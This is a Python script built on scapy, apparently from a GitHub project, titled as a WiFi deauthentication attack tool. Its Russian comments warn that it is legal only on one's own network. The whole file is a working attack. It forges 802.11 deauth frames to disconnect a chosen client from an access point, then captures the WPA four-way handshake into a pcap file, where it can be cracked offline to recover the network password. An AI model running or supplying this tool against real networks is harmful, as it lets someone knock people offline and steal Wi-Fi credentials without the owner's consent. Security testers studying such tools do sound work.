#!/usr/bin/env python3

'''
	Скрипт для деавторизации из захвата handshake. Использовать только на своей сети! 
	Любые действия с чужими сетями - противозаконны! Помните это
	
	Author: Redfern89
	git: https://github.com/Redfern89/py-deauth
'''

import time
import threading
import argparse
from scapy.all import *

print("\n--- Welcome to WiFi Deauth Attack Script ---")

parser = argparse.ArgumentParser(description="WiFi Deauth Attack Script")
parser.add_argument("-i", "--interface", required=True, help="Интерфейс для прослушивания (например, wlan0mon)")
parser.add_argument("-c", "--channel", type=int, required=True, help="Канал WiFi (например, 11)")
parser.add_argument("-b", "--bssid", required=True, help="BSSID точки доступа (например, 04:5e:a4:6a:28:47)")
parser.add_argument("-s", "--client", required=True, help="MAC-адрес клиента (например, 80:32:53:ae:f8:b2)")
parser.add_argument("-w", "--pcap-file", required=True, help="Файл для сохранения handshake (например file.pcap)")
args = parser.parse_args()

eapol_detect_falg = False
eapol_start_time = None
beacon_detect_flag = False
all_keys_flag = False
timeout_flag = False
key1_flag = False
key2_flag = False
key3_flag = False
key4_flag = False
key1_2_flage = False
deauth_flag = False
acks = 0
packet_buff = []

print(f"[+] Switching {args.interface} to channel {args.channel}")
subprocess.run(["iwconfig", args.interface, "channel", str(args.channel)], capture_output=True, text=True)
print(f"[+] Waiting beacon frame from {args.bssid}")

def send_deauth(iface, bssid, cssid):
	print(f"[+] Send 10-packet deauth to {bssid} as {cssid}")
	deauth_pkt = RadioTap() / Dot11(addr1=cssid, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
	
	for j in range(10):
		sendp(deauth_pkt, iface=iface, inter=0.01, verbose=False)
	

def packet_handler(pkt):
	global eapol_detect_falg
	global beacon_detect_flag
	global eapol_start_time
	global key1_flag
	global key2_flag
	global key3_flag
	global key4_flag
	global all_keys_flag
	global packet_buff
	global acks
	
	if pkt.haslayer(Dot11) and pkt.type == 1 and pkt.subtype == 13 and pkt[Dot11].addr1 == args.bssid:
		acks += 1
	
	if pkt.haslayer(Dot11Elt) and pkt[Dot11].addr3 == args.bssid:
		if not beacon_detect_flag:
			#wrpcap(args.pcap_file, pkt)
			packet_buff.append(pkt)
			ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt.haslayer(Dot11Elt) else None
			print(f"[+] Done, ssid=\"{ssid}\"")
			print(f"[+] Waiting EAPOL frame from {args.bssid}")
			beacon_detect_flag = True
			
			deauth_thread = threading.Thread(target=send_deauth, args=(args.interface, args.bssid, args.client))
			deauth_thread.start()
			
	if pkt.haslayer(EAPOL) and pkt[EAPOL].type == 3 and (pkt[Dot11].addr1 == args.bssid or pkt[Dot11].addr2 == args.bssid):
		if not eapol_detect_falg:
			eapol_detect_falg = True
			eapol_start_time = time.time()
			print(f"[+] {acks} ACKs")
			
		raw_data = bytes(pkt[EAPOL])
		key_info = int.from_bytes(raw_data[5:7], 'big') # Key Inforamtion flag start at 0x008a
		ack = bool(key_info & 0x0080)      # 7-й бит (Key ACK)
		mic = bool(key_info & 0x0100)      # 8-й бит (Key MIC)
		install = bool(key_info & 0x0200)  # 9-й бит (Install)
		secure = bool(key_info & 0x0400)   # 10-й бит (Secure)
		_pkt = None
		
		if ack and not mic and not install and not secure:
			if not key1_flag:
				print("[+] Received KEY1")
				packet_buff.append(pkt)
				key1_flag = True
		elif mic and not ack and not install and not secure:
			if not key2_flag:
				print("[+] Received KEY2")
				packet_buff.append(pkt)
				key2_flag = True
		elif mic and ack and install and not secure:
			if not key3_flag:
				print("[+] Received KEY3, skipped")
				#packet_buff.append(pkt)
				key3_flag = True
		elif mic and install and not secure:
			if not key4_flag:
				print("[+] Received KEY4, skipped")
				#packet_buff.append(pkt)
				key4_flag = True
		else:
			print("[!] Unknown EAPOL Message")
	if key1_flag and key2_flag and key3_flag and key4_flag:
		wrpcap(args.pcap_file, packet_buff)
		print(f"[+] All data saved to {args.pcap_file}, thank you")
		all_keys_flag = True
		
def keys_check_timeout():
	global timeout_flag
	while not all_keys_flag:
		if eapol_detect_falg and eapol_start_time:
			elapsed_time = round(time.time() - eapol_start_time)
			if elapsed_time >= 5:
				print('[-] Timeout!')
				timeout_flag = True
				break
		time.sleep(0.5)

eapol_timeout_thread = threading.Thread(target=keys_check_timeout)
eapol_timeout_thread.start()

sniff(iface=args.interface, prn=packet_handler, stop_filter=lambda pkt: (all_keys_flag or timeout_flag))
